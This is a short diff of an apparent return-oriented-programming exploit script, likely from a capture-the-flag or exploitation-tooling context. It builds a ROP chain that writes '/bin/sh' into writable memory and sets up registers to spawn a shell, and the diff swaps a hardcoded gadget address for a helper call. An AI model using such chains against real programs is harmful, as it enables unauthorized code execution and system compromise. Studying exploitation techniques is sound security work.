@@ -13,7 +13,7 @@ chain = b'A' * rop.offset
 chain += rop.fill_reg('r8', writeable_mem)
 chain += rop.fill_reg('rax', '/bin/sh\0')
 
-chain += p64(0x0000000000400779) # mov qword ptr [r8], rax; pop r15; ret;
+chain += rop.get_primitives()
 chain += p64(0) # r15
 
 chain += rop.fill_reg('rdi', writeable_mem)
